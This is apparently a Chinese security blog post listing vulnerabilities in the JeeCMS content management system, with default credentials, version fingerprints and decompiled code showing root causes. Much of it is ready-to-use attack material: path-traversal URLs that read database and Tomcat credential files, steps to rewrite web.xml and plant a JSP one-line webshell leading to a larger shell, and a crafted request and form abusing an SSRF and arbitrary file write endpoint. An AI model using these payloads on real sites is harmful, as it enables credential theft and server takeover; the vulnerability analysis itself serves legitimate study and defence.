{"title":"Jeecms内容管理发布漏洞一览","slug":"网安大类/Vulnerable/CMS/Java/Jeecms内容管理发布漏洞一览","date":"2019-08-01T01:34:30.000Z","updated":"2022-03-29T05:39:05.027Z","url":"2019/8-1-413.html","path":"api/articles/2019/8-1-413.html.json","covers":["https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191008113719.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191008114250.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191008115544.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191008115438.png","https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191008120459.png"],"content":"<p>[TOC]</p>\n<a id=\"more\"></a>\n<h4 id=\"0x00-前言\"><a href=\"#0x00-前言\" class=\"headerlink\" title=\"0x00 前言\"></a>0x00 前言</h4><p>描述：JEECMS是基于java技术开发继承其强大、稳定、安全、高效、跨平台等多方面的优点;<br>采用<code>SpringMVC3+Spring3+Hibernate3+Freemarker</code>主流技术架构安全性做得非常变态，当网站安装完成后就不再允许执行任何目录下的jsp文件了<code>web.xml配置了过滤器禁止了很多种动态脚本</code>。</p>\n<p>cms版本特征：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#2.x后台</span></span><br><span class=\"line\">login/Jeecms.do</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#3.x后台</span></span><br><span class=\"line\">jeeadmin/jeecms/index.do</span><br></pre></td></tr></table></figure></p>\n<p><strong>漏洞一览：</strong></p>\n<ul>\n<li>缺省账号/密码</li>\n<li>2.x版本文件读取：Com_edit.do</li>\n<li>3.x版本文件读取：v_edit.do</li>\n</ul>\n<p><br></p>\n<h5 id=\"1-缺省账号密码\"><a href=\"#1-缺省账号密码\" class=\"headerlink\" title=\"1.缺省账号密码\"></a>1.缺省账号密码</h5><ul>\n<li>默认账户：admin</li>\n<li>默认密码：password</li>\n</ul>\n<hr/>\n\n<h4 id=\"2-x-版本缺陷\"><a href=\"#2-x-版本缺陷\" class=\"headerlink\" title=\"2.x 版本缺陷\"></a>2.x 版本缺陷</h4><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#JEECMS2.x版读取路径：</span></span><br><span class=\"line\">admin/core/template/Com_edit.do?relPath=\\../../../classes/jdbc.properties</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#JEECMS2.x版读取路径：</span></span><br><span class=\"line\">admin/core/template/Com_edit.do?relPath=\\../../../web.xml</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#JEECMS2.x版读取路径：</span></span><br><span class=\"line\">admin/core/template/Com_edit.do?relPath=\\../../../../install\\install_setup.jsp</span><br></pre></td></tr></table></figure>\n<hr/>\n\n<h4 id=\"3-x-版本缺陷\"><a href=\"#3-x-版本缺陷\" class=\"headerlink\" title=\"3.x 版本缺陷\"></a>3.x 版本缺陷</h4><p><strong>常规</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#获取tomcat密码：</span></span><br><span class=\"line\">/jeeadmin/jeecms/template/v_edit.do?root=../../conf/&amp;name=../../conf/tomcat-users.xml</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#获取JDBC数据库账号密码：</span></span><br><span class=\"line\">/jeeadmin/jeecms/template/v_edit.do?root=%2FWEB-INF%2Fconfig%2F&amp;name=%2FWEB-INF%2Fconfig%2Fjdbc.properties</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#修改web.xml取消对jsp的过滤：</span></span><br><span class=\"line\">/jeeadmin/jeecms/template/v_edit.do?root=%2FWEB-INF%2F&amp;name=%2FWEB-INF%2Fweb.xml</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#修改install/install_setup.jsp：</span></span><br><span class=\"line\">/jeeadmin/jeecms/template/v_edit.do?root=%2Finstall%2F&amp;name=%2Finstall%2Finstall_setup.jsp</span><br><span class=\"line\"><span class=\"comment\">#插入Jsp一句话：</span></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\"><span class=\"keyword\">if</span>(request.getParameter(<span class=\"string\">\"f\"</span>)!=null)( new java.io.FileOutputStream(application.getRealPath(<span class=\"string\">\"(\"</span>f<span class=\"string\">\")) ).write(request.getParameter(\"</span>t<span class=\"string\">\").getBytes());</span></span><br><span class=\"line\"><span class=\"string\">%&gt;</span></span><br><span class=\"line\"><span class=\"string\">#修改后的一句话目录</span></span><br><span class=\"line\"><span class=\"string\">/install/install_setup.jsp</span></span><br><span class=\"line\"><span class=\"string\">#一句话连接成功后的jsp大马目录：</span></span><br><span class=\"line\"><span class=\"string\">/ma.jsp</span></span><br></pre></td></tr></table></figure><br><br></p>\n<h4 id=\"7-x-版本缺陷\"><a href=\"#7-x-版本缺陷\" class=\"headerlink\" title=\"7.x 版本缺陷\"></a>7.x 版本缺陷</h4><p><strong>任意文件上传</strong><br>漏洞危害：远程攻击者可借助upfile参数利用服务器端请求伪造漏洞漏洞获取敏感信息，攻击内部网络主机或写入恶意文件。<br>影响版本: jeecms V6/v7版本<br>脆弱接口: <code>/ueditor/getRemoteImage.jspx</code></p>\n<p>描述：源码中寻找getRemoteImage.jspx文件，服务器上未发现该文件了。尝试用内容匹配的方式去寻找存在问题的class组件。<br>使用everything的content文件内容匹配功能查找相关接口<code>EeditorAct.class</code>,并且对其进行反编译分析接口如下图所示：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191008113719.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure><br>代码：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191008114250.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure><br>远程文件的url直接由客户端的upfile参数传入，之后以ue_separate_ue为分隔符来进行分割，之后直接调用saveRemoteImage函数，下面跟进saveRemoteImage函数：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191008115544.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure><br>该函数直接调用HttpClient类建立连接，读取字节流，然后通过UploadUtils.generateFilename来获取保存路径，此处只用Apache的FileNameUtils.getFileSufix方法来获取扩展名，没有进行任何验证。最后通过IOUtils.copy完成文件的创建。</p>\n<p>原因：该接口的主要功能是读取远程服务器上的资源并且未对资源的类型或者后缀进行判断并直接将其写入到/u/cms/www/目录下。<br>此处同样存在SSRF漏洞，也就是说通过该接口可以探测内网、访问公网，又由于此处存在了任意文件写入才导致了黑页的写入。<br>数据包转换地址：<a href=\"http://ld8.me/multipart.php\" target=\"_blank\" rel=\"noopener\">http://ld8.me/multipart.php</a></p>\n<p>漏洞演示：转换之后服务器端发送的数据包如下：<br><figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /ueditor/getRemoteImage.jspx HTTP/1.1</span><br><span class=\"line\">Host: 192.168.231.133:8080</span><br><span class=\"line\">Proxy-Connection: keep-alive</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2188.2 Safari/537.36</span><br><span class=\"line\">Content-Type: multipart/form-data; boundary=--------WebKitFormBoundaryYJmKM8kHUlKMIlvC</span><br><span class=\"line\">Accept-Encoding: gzip, deflate, sdch</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.8</span><br><span class=\"line\">Cookie: JSESSIONID=A8872FC0A3E148E7A262F1A3D31B8FF9; _site_id_cookie=1; clientlanguage=zh_CN</span><br><span class=\"line\"> </span><br><span class=\"line\"> </span><br><span class=\"line\">----------WebKitFormBoundaryYJmKM8kHUlKMIlvC</span><br><span class=\"line\">Content-Disposition: form-data; name=\"upfile\"</span><br><span class=\"line\"> </span><br><span class=\"line\">http://192.168.231.134/test.html</span><br><span class=\"line\">----------WebKitFormBoundaryYJmKM8kHUlKMIlvC--</span><br></pre></td></tr></table></figure><br>由于代码端上传的时候直接是用参数upfile，为了方便构造数据包也可以直接构造一个表单来完成此次的操作。表单构造内容如下图所示：<br><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;form action=<span class=\"string\">\"http://192.168.231.133:8080/ueditor/getRemoteImage.jspx\"</span> method=<span class=\"string\">\"post\"</span> enctype=<span class=\"string\">\"multipart/form-data\"</span>&gt;</span><br><span class=\"line\">&lt;input name=<span class=\"string\">\"upfile\"</span> value=<span class=\"string\">\"ue_separate_ue\"</span>&gt;</span><br><span class=\"line\">&lt;input type=<span class=\"string\">\"submit\"</span>&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191008115438.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p>之后进行表单提交和BurpSuite重放数据库包即可;</p>\n<p><br></p>\n<p><strong>任意文件上传</strong><br>漏洞说明:该系统提供swfAttach文件上传功能，其中对用户提交的上传文件没有进行充分的检查，导致任意注册用户在前台即可上传任意格式的文件。<br>利用场景：前台注册用户。默认注册地址：<a href=\"http://www.xxx.com/register.jspx\" target=\"_blank\" rel=\"noopener\">http://www.xxx.com/register.jspx</a></p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@RequestMapping</span>(value = <span class=\"string\">\"/member/o_swfAttachsUpload.jspx\"</span>, method = RequestMethod.POST)</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">swfAttachsUpload</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">            String root,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">            Integer uploadNum,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">            @RequestParam(value = <span class=\"string\">\"Filedata\"</span>, required = <span class=\"keyword\">false</span>)</span> MultipartFile file,</span></span><br><span class=\"line\"><span class=\"function\">            HttpServletRequest request, HttpServletResponse response,</span></span><br><span class=\"line\"><span class=\"function\">            ModelMap model) <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">super</span>.swfAttachsUpload(root, uploadNum, file, request, response, model);</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>跟进swfAttachsUpload：<br><figure class=\"highlight jsp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">protected</span> <span class=\"keyword\">void</span> <span class=\"title\">swfAttachsUpload</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">            String root,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">            Integer uploadNum,</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">            @RequestParam(value = <span class=\"string\">\"Filedata\"</span>, required = <span class=\"keyword\">false</span>)</span> MultipartFile file,</span></span><br><span class=\"line\"><span class=\"function\">            HttpServletRequest request, HttpServletResponse response,</span></span><br><span class=\"line\"><span class=\"function\">            ModelMap model) <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        JSONObject data=<span class=\"keyword\">new</span> JSONObject();</span><br><span class=\"line\">        WebCoreErrors errors = validateUpload( file, request);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (errors.hasErrors()) &#123;</span><br><span class=\"line\">            data.put(<span class=\"string\">\"error\"</span>, errors.getErrors().get(<span class=\"number\">0</span>));</span><br><span class=\"line\">            ResponseUtils.renderJson(response, data.toString());</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">            CmsSite site = CmsUtils.getSite(request);</span><br><span class=\"line\">            String ctx = request.getContextPath();</span><br><span class=\"line\">            String origName = file.getOriginalFilename();</span><br><span class=\"line\">            String ext = FilenameUtils.getExtension(origName).toLowerCase(</span><br><span class=\"line\">                    Locale.ENGLISH);</span><br><span class=\"line\">            String fileUrl=<span class=\"string\">\"\"</span>;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (site.getConfig().getUploadToDb()) &#123;</span><br><span class=\"line\">                    String dbFilePath = site.getConfig().getDbFileUri();</span><br><span class=\"line\">                    fileUrl = dbFileMng.storeByExt(site.getUploadPath(), ext, file</span><br><span class=\"line\">                            .getInputStream());</span><br><span class=\"line\">                    fileUrl = request.getContextPath() + dbFilePath + fileUrl;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (site.getUploadFtp() != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">                    Ftp ftp = site.getUploadFtp();</span><br><span class=\"line\">                    String ftpUrl = ftp.getUrl();</span><br><span class=\"line\">                    fileUrl = ftp.storeByExt(site.getUploadPath(), ext, file</span><br><span class=\"line\">                            .getInputStream());</span><br><span class=\"line\">                </span><br><span class=\"line\">                    fileUrl = ftpUrl + fileUrl;</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                    fileUrl = fileRepository.storeByExt(site.getUploadPath(), ext,</span><br><span class=\"line\">                            file); <span class=\"comment\">//没有进行合法文件后缀检查。</span></span><br><span class=\"line\">                </span><br><span class=\"line\">                    fileUrl = ctx + fileUrl;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                cmsUserMng.updateUploadSize(CmsUtils.getUserId(request), Integer.parseInt(String.valueOf(file.getSize()/<span class=\"number\">1024</span>)));</span><br><span class=\"line\">                fileMng.saveFileByPath(fileUrl, origName, <span class=\"keyword\">false</span>); <span class=\"comment\">//没有进行合法文件后缀检查</span></span><br><span class=\"line\">                model.addAttribute(<span class=\"string\">\"attachmentPath\"</span>, fileUrl);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (IllegalStateException e) &#123;</span><br><span class=\"line\">                model.addAttribute(<span class=\"string\">\"error\"</span>, e.getMessage());</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (IOException e) &#123;</span><br><span class=\"line\">                model.addAttribute(<span class=\"string\">\"error\"</span>, e.getMessage());</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            data.put(<span class=\"string\">\"attachUrl\"</span>, fileUrl);</span><br><span class=\"line\">            data.put(<span class=\"string\">\"attachName\"</span>, origName);</span><br><span class=\"line\">            ResponseUtils.renderJson(response, data.toString());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure><br>通过构造以下表单，就可以进行测试：<br><figure class=\"image-box\">\n                <img src=\"https://cdn.jsdelivr.net/gh/WeiyiGeek/blogimage/2019/1/20191008120459.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<hr/>\n\n<h4 id=\"注意事项\"><a href=\"#注意事项\" class=\"headerlink\" title=\"注意事项\"></a>注意事项</h4><ul>\n<li>2.X 在后台可以上传媒体格式为jsp的文件</li>\n<li>web.xml 修改后需要重启服务器（自动加载更新的除外）</li>\n</ul>\n<p><strong>参考附录</strong></p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/rebeyond/p/5141316.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/rebeyond/p/5141316.html</a></li>\n</ul>\n","comments":true,"excerpt":"[TOC]","categories":[{"name":"cms指纹","path":"api/categories/cms指纹.json"}],"tags":[{"name":"Jeecms","path":"api/tags/Jeecms.json"}]}